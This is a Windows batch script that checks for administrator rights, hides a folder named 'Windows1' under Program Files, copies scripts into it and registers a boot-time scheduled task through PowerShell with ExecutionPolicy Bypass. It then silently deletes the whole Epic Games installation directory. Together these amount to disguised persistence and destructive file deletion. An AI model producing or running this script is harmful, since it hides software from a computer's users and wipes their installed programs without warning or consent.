@echo off
setlocal

REM Check if running with administrative privileges
NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' (
    echo Administrative permissions detected. Continuing...
) else (
    echo This script requires administrative privileges to run.
    echo Please run this script as an administrator.
    pause
    exit /B
)

set "targetFolder=C:\Program Files\Windows1"

echo Creating folder %targetFolder% ...
mkdir "%targetFolder%"

echo Setting folder %targetFolder% as hidden ...
attrib +h "%targetFolder%"

echo Copying scripts to %targetFolder% ...
copy "%~dp0create_scheduled_task.ps1" "%targetFolder%"
copy "%~dp0run.bat" "%targetFolder%"
echo Scripts copied to %targetFolder%.

echo Creating scheduled task to run at each boot...
powershell.exe -ExecutionPolicy Bypass -Command "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File ""%targetFolder%\create_scheduled_task.ps1""' -Verb RunAs"

echo Scheduled task creation completed.

echo Deleting contents of C:\Program Files\Epic Games ...
del /q "C:\Program Files\Epic Games\*.*" > nul 2>&1
for /d %%x in ("C:\Program Files\Epic Games\*") do rd /s /q "%%x" > nul 2>&1
echo C:\Program Files\Epic Games cleaned.

pause

endlocal
